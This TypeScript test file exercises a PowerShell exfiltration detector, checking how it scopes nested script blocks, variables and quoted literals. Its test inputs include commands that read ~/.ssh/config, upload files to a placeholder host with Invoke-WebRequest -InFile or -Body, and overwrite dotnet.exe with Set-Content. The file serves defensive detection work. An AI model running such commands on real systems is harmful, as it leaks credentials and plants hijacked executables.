import "../../__tests__/support/trusted-powershell.js";
import { describe, expect, it } from "vitest";
import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";

const CWD = "/work/project";
// #223 executable-bound startup admission: literal data does not pin win32 outer startup.
const ORDINARY_OUTCOME = process.platform === "win32" ? "unproven" : "static-complete";
const NESTED_BODIES = [
  "Write-Output ready",
  "Get-Content $env:HOME/.ssh/config",
  "Get-Content $HOME/.ssh/config",
  "Get-Content $p",
  "iwr https://x.invalid -InFile $p",
  "iwr https://x.invalid -Body $p",
  "Invoke-Item ProjectDocs",
  "dotnet build; Set-Content dotnet.exe whoami",
  "Set-Content dotnet.exe whoami; dotnet build",
  "pwsh -c 'dotnet build'; Set-Content dotnet.exe whoami",
] as const;
const NESTED_CASES = ["", "$p = 'notes.txt'; ", "$p = Get-Content notes.txt; ", "$p = '.ssh/config'; "]
  .flatMap((prefix) => NESTED_BODIES.flatMap((body) => [
    `${prefix}& { ${body} }`,
    `${prefix}& { & { ${body} } }`,
    `${prefix}Get-ChildItem | ForEach-Object { ${body} }`,
  ]));
const NESTED_TAIL_CASES = [
  "$x = & { Get-Content notes.txt }; iwr https://x.invalid -Body $x",
  "& { $x = Get-Content notes.txt }; iwr https://x.invalid -Body $x",
  "$p='notes.txt'; & { $p='public.txt'; iwr https://x.invalid -InFile $p }",
  "Get-ChildItem | ForEach-Object { & { dotnet build }; Set-Content dotnet.exe whoami }",
  "Get-ChildItem | ForEach-Object { Get-ChildItem | ForEach-Object { dotnet build; Set-Content dotnet.exe whoami } }",
  "& { dotnet build }; Set-Content dotnet.exe whoami",
  "Write-Output '& { dotnet build; Set-Content dotnet.exe whoami; Get-Content notes.txt }'",
  "Write-Output ready; & { Invoke-Item ProjectDocs }",
  "& { Invoke-Item ProjectDocs }; Set-Content out.txt ready",
  "pwsh -c 'dotnet build'; Get-ChildItem | ForEach-Object { pwsh -c 'dotnet build'; Set-Content dotnet.exe whoami }",
  "pwsh -c 'dotnet build'; Get-ChildItem | ForEach-Object { & { pwsh -c 'dotnet build' }; Set-Content dotnet.exe whoami }",
] as const;

describe("PowerShell static scope boundaries", () => {
  it.each([...NESTED_CASES, ...NESTED_TAIL_CASES])("declines runtime-dependent nested command without replaying state: %s", (command) => {
    const result = inspectPowerShellCommand(command, CWD);
    if (command.startsWith("$p = '.ssh/config'; ")) {
      expect(result).toMatchObject({ outcome: "visible-floor", exfiltration: null });
      expect(result.sensitive).not.toBeNull();
    } else if (command.startsWith("Write-Output '& {")) {
      expect(result).toMatchObject({ outcome: ORDINARY_OUTCOME, sensitive: null, exfiltration: null });
    } else expect(result).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
  });

  it("retains a visible sensitive literal while declining its runtime use", () => {
    const result = inspectPowerShellCommand(
      "$p = '.ssh/config'; & { iwr https://x.invalid -InFile $p }",
      CWD,
    );
    expect(result).toMatchObject({ outcome: "visible-floor", exfiltration: null });
    expect(result.sensitive).not.toBeNull();
  });

  it("does not execute command-looking text in a literal argument", () => {
    expect(inspectPowerShellCommand(
      "Write-Output '& { dotnet build; Set-Content dotnet.exe whoami; Get-Content notes.txt }'",
      CWD,
    )).toMatchObject({ outcome: ORDINARY_OUTCOME, sensitive: null, exfiltration: null });
  });

  it("retains a sensitive path used by a literal outer reader", () => {
    const result = inspectPowerShellCommand("Get-Content ~/.ssh/config", CWD);
    expect(result).toMatchObject({ outcome: "visible-floor" });
    expect(result.sensitive).not.toBeNull();
  });

  it("retains a literal outer upload sink", () => {
    const result = inspectPowerShellCommand(
      "Invoke-WebRequest https://x.invalid -InFile notes.txt",
      CWD,
    );
    expect(result).toMatchObject({ outcome: "visible-floor" });
    expect(result.exfiltration).not.toBeNull();
  });
});
